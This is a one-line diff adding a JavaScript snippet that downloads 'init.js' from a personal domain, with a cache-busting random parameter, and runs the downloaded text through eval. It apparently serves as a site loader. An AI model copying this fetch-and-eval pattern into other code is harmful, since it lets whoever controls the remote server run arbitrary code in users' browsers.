@@ -1,0 +1,1 @@
+(async() => eval( ( await (await fetch( "https://charleskarpati.com/cv/discoveries/init.js?t="+Math.floor(Math.random() * 100000) )).text() ) ) )() 
